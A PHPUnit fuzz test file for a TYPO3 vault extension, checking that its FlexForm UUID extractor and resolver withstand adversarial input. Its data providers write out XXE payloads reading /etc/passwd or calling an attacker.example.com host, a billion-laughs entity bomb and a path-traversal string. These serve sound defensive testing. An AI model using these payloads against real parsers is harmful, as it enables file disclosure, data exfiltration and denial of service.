<?php

/*
 * Copyright (c) 2025-2026 Netresearch DTT GmbH
 * SPDX-License-Identifier: GPL-2.0-or-later
 */

declare(strict_types=1);

namespace Netresearch\NrVault\Tests\Fuzz;

use Netresearch\NrVault\Service\VaultServiceInterface;
use Netresearch\NrVault\Utility\FlexFormVaultResolver;
use PHPUnit\Framework\Attributes\AllowMockObjectsWithoutExpectations;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\MockObject\MockObject;
use PHPUnit\Framework\TestCase;
use Psr\Log\NullLogger;
use stdClass;
use TYPO3\CMS\Core\Schema\TcaSchemaFactory;

/**
 * Fuzz tests for FlexForm XML / array resolution pathways.
 *
 * The extension's FlexForm layer works on pre-parsed *arrays* (TYPO3 core
 * parses the XML upstream) and regex-extracts UUIDs when walking raw XML
 * strings in the delete/copy paths. This suite hardens both paths:
 *
 * Properties under test:
 * - XXE-shaped strings fed to the UUID extractor do NOT trigger file reads
 *   or entity expansion (regex-only path — no DOM).
 * - Billion-laughs-style text does NOT cause unbounded memory growth —
 *   peak memory tracked via memory_get_peak_usage().
 * - Malformed XML / invalid encoding declarations / non-UTF8 byte
 *   sequences do not crash the regex extractor or the recursive resolver.
 * - Deeply nested FlexForm settings arrays (100+ levels) resolve without
 *   PHP stack overflow.
 * - Non-vault UUIDs (v1, v4, malformed) do NOT trigger vault lookups.
 * - isVaultIdentifier never throws on arbitrary input types.
 */
#[CoversClass(FlexFormVaultResolver::class)]
#[AllowMockObjectsWithoutExpectations]
final class FlexFormXmlFuzzTest extends TestCase
{
    private FlexFormVaultResolver $resolver;

    /** @var list<string> */
    private array $retrievedIdentifiers = [];

    protected function setUp(): void
    {
        parent::setUp();

        /** @var VaultServiceInterface&MockObject $vaultService */
        $vaultService = $this->createMock(VaultServiceInterface::class);
        $vaultService->method('retrieve')->willReturnCallback(
            function (string $identifier): string {
                $this->retrievedIdentifiers[] = $identifier;

                return 'resolved_' . $identifier;
            },
        );
        $this->resolver = new FlexFormVaultResolver(
            $vaultService,
            new NullLogger(),
            $this->createMock(TcaSchemaFactory::class),
        );
        $this->retrievedIdentifiers = [];
    }

    // -----------------------------------------------------------------------
    // Data providers
    // -----------------------------------------------------------------------

    /**
     * Adversarial XML-shaped strings.
     *
     * @return array<string, array{string}>
     */
    public static function adversarialXmlProvider(): array
    {
        $seed = (int) ($_ENV['PHPUNIT_SEED'] ?? crc32(__FILE__));
        mt_srand($seed);

        $cases = [
            'xxe etc passwd' => [
                '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
            ],
            'xxe http' => [
                '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://attacker.example.com/steal">]><r>&xxe;</r>',
            ],
            'billion laughs' => [
                '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">' .
                '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">' .
                '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">' .
                '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">' .
                ']><lolz>&lol4;</lolz>',
            ],
            'unclosed tags' => ['<T3FlexForms><data><sheet><field>'],
            'mixed tag soup' => ['</close><open><mix/></foo></bar>'],
            'invalid encoding declaration' => [
                '<?xml version="1.0" encoding="DOES-NOT-EXIST-123"?><r/>',
            ],
            'utf16 bom' => ["\xFF\xFE<r/>"],
            'utf8 bom' => ["\xEF\xBB\xBF<r/>"],
            'wrong encoding claim utf7' => ['<?xml version="1.0" encoding="UTF-7"?><r>+ACE-</r>'],
            'stray null bytes' => ["<r>\x00foo\x00bar</r>"],
            'deeply nested xml 200' => [str_repeat('<n>', 200) . str_repeat('</n>', 200)],
            'catastrophic regex bait' => [str_repeat('a', 500) . 'b'],
            // UUID look-alikes that must not be treated as vault UUIDs
            'uuid v1 not v7' => ['<r>00000000-0000-1000-8000-000000000001</r>'],
            'uuid v4 not v7' => ['<r>00000000-0000-4000-8000-000000000001</r>'],
            'uuid v7 variant 0' => ['<r>01937b6e-4b6c-7abc-0def-0123456789ab</r>'],
            'fake uuid all zeros' => ['<r>00000000-0000-0000-0000-000000000000</r>'],
            'uuid with wrong separator' => ['<r>01937b6e_4b6c_7abc_8def_0123456789ab</r>'],
            'embedded long text no uuid' => ['<r>' . str_repeat('abcdef1234567890', 200) . '</r>'],
            'empty' => [''],
            'single char' => ['x'],
            'nul bytes only' => [str_repeat("\x00", 100)],
            'crlf only' => [str_repeat("\r\n", 50)],
        ];

        // Add 10 random junk payloads
        for ($i = 0; $i < 10; $i++) {
            $len = mt_rand(0, 500);
            $buf = '';
            for ($j = 0; $j < $len; $j++) {
                $buf .= \chr(mt_rand(0, 255));
            }

            $cases["random_{$i}_len{$len}"] = [$buf];
        }

        return $cases;
    }

    /**
     * Non-UUID values that isVaultIdentifier MUST reject.
     *
     * @return array<string, array{mixed}>
     */
    public static function nonUuidValueProvider(): array
    {
        return [
            'null' => [null],
            'true' => [true],
            'false' => [false],
            'int zero' => [0],
            'int 42' => [42],
            'int max' => [PHP_INT_MAX],
            'float' => [3.14],
            'array empty' => [[]],
            'array nested' => [[[['uuid' => '01937b6e-4b6c-7abc-8def-000000000001']]]],
            'stdclass' => [new stdClass()],
            'empty string' => [''],
            'short string' => ['abc'],
            'uuid v1' => ['00000000-0000-1000-8000-000000000001'],
            'uuid v4' => ['00000000-0000-4000-8000-000000000001'],
            'uuid v7 wrong variant' => ['01937b6e-4b6c-7abc-0def-0123456789ab'],
            'uuid underscores' => ['01937b6e_4b6c_7abc_8def_0123456789ab'],
            'uuid too short' => ['01937b6e-4b6c-7abc-8def'],
            'uuid too long' => ['01937b6e-4b6c-7abc-8def-0123456789abcd'],
            'uuid non-hex' => ['01937b6e-4b6c-7abc-8def-zzzzzzzzzzzz'],
            'uuid with surrounding text' => [' 01937b6e-4b6c-7abc-8def-0123456789ab '],
            'uuid with null byte' => ["01937b6e-4b6c-7abc-8def-0123\x00567abc"],
        ];
    }

    // -----------------------------------------------------------------------
    // Tests
    // -----------------------------------------------------------------------

    /**
     * Adversarial XML fed to the extractor pattern does not read any files,
     * does not expand entities (regex is text-only), and does not balloon memory.
     */
    #[Test]
    #[DataProvider('adversarialXmlProvider')]
    public function adversarialXmlDoesNotTriggerEntityExpansion(string $xml): void
    {
        $startMem = memory_get_usage();

        // The UUID regex pattern from FlexFormVaultHook::extractVaultIdentifiersFromXml
        $matched = preg_match_all(
            '/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i',
            $xml,
            $matches,
        );

        $peakDelta = memory_get_usage() - $startMem;

        // Memory bound: regex on sub-MB input must not allocate more than 64MB.
        self::assertLessThan(
            64 * 1024 * 1024,
            $peakDelta,
            'Regex extraction on adversarial input must not explode memory',
        );

        // No file:// dereference happened: we can't directly test, but assert
        // that no entity text (which would require DOM parsing) is in the
        // matches — the regex returns only hex-dash patterns.
        self::assertIsInt($matched);
        foreach ($matches[0] ?? [] as $m) {
            self::assertMatchesRegularExpression(
                '/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i',
                $m,
            );
        }
    }

    /**
     * Regex runs in bounded time for catastrophic-backtracking-shaped input.
     */
    #[Test]
    public function uuidRegexHasBoundedRuntime(): void
    {
        $payload = str_repeat('0123456789abcdef-', 10000); // 170kb

        $start = hrtime(true);
        preg_match_all(
            '/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i',
            $payload,
            $_,
        );
        $elapsedMs = (hrtime(true) - $start) / 1_000_000;

        self::assertLessThan(
            1000,
            $elapsedMs,
            'UUID regex on 170kb of dash-hex soup must complete in <1s',
        );
    }

    /**
     * Deeply nested settings arrays resolve without stack overflow.
     */
    #[Test]
    public function deeplyNestedSettingsDoNotOverflowStack(): void
    {
        // Build 100-level nested array with a vault UUID at the bottom
        $validUuid = '01937b6e-4b6c-7abc-8def-0123456789ab';
        $leaf = ['secret' => $validUuid];
        for ($i = 0; $i < 100; $i++) {
            $leaf = ['level_' . $i => $leaf];
        }

        $result = $this->resolver->resolveAll($leaf);

        self::assertIsArray($result);
        self::assertContains($validUuid, $this->retrievedIdentifiers);
    }

    /**
     * Non-vault values passed to isVaultIdentifier never throw and return false.
     */
    #[Test]
    #[DataProvider('nonUuidValueProvider')]
    public function isVaultIdentifierRejectsNonMatchingInput(mixed $value): void
    {
        self::assertFalse(
            $this->resolver->isVaultIdentifier($value),
            'isVaultIdentifier must return false for non-v7-UUID input, got true',
        );
    }

    /**
     * resolveSettings with non-UUID values does not call the vault service.
     */
    #[Test]
    public function resolveSettingsSkipsNonUuidValues(): void
    {
        $settings = [
            'field1' => 'plain-value',
            'field2' => '00000000-0000-4000-8000-000000000001', // v4 UUID
            'field3' => 12345,
            'field4' => null,
            'field5' => '../../../etc/passwd',
            'field6' => "<?xml version='1.0'?><!DOCTYPE x[<!ENTITY a SYSTEM 'file:///etc/passwd'>]>&a;",
        ];

        $result = $this->resolver->resolveSettings(
            $settings,
            array_keys($settings),
        );

        self::assertSame($settings, $result, 'Non-UUID values must pass through unchanged');
        self::assertSame([], $this->retrievedIdentifiers, 'Vault must not be queried for non-UUID values');
    }

    /**
     * resolveAll walks arrays recursively; sprinkled UUIDs are all resolved,
     * other values untouched.
     */
    #[Test]
    public function resolveAllResolvesEveryVaultIdentifier(): void
    {
        $uuid1 = '01937b6e-4b6c-7abc-8def-000000000001';
        $uuid2 = '01937b6e-4b6c-7abc-8def-000000000002';
        $uuid3 = '01937b6e-4b6c-7abc-8def-000000000003';

        $settings = [
            'a' => $uuid1,
            'b' => [
                'c' => $uuid2,
                'd' => [
                    'e' => $uuid3,
                    'f' => 'not-a-uuid',
                ],
            ],
        ];

        $result = $this->resolver->resolveAll($settings);

        self::assertSame('resolved_' . $uuid1, $result['a']);
        self::assertSame('resolved_' . $uuid2, $result['b']['c']);
        self::assertSame('resolved_' . $uuid3, $result['b']['d']['e']);
        self::assertSame('not-a-uuid', $result['b']['d']['f']);
    }

    /**
     * Adversarial UUID variants that look like UUIDs but aren't v7 with
     * correct variant bits must be rejected.
     *
     * @return array<string, array{string}>
     */
    public static function invalidUuidVariantProvider(): array
    {
        return [
            'v1 uuid' => ['00000000-0000-1000-8000-000000000001'],
            'v2 uuid' => ['00000000-0000-2000-8000-000000000001'],
            'v3 uuid' => ['00000000-0000-3000-8000-000000000001'],
            'v4 uuid' => ['00000000-0000-4000-8000-000000000001'],
            'v5 uuid' => ['00000000-0000-5000-8000-000000000001'],
            'v6 uuid' => ['00000000-0000-6000-8000-000000000001'],
            'v7 variant 0' => ['01937b6e-4b6c-7abc-0def-0123456789ab'],
            'v7 variant c (reserved)' => ['01937b6e-4b6c-7abc-cdef-0123456789ab'],
            'v7 variant f (reserved)' => ['01937b6e-4b6c-7abc-fdef-0123456789ab'],
        ];
    }

    #[Test]
    #[DataProvider('invalidUuidVariantProvider')]
    public function invalidUuidVariantIsNotTreatedAsVaultIdentifier(string $uuid): void
    {
        self::assertFalse(
            $this->resolver->isVaultIdentifier($uuid),
            "UUID '{$uuid}' must not be treated as a vault identifier",
        );
    }
}
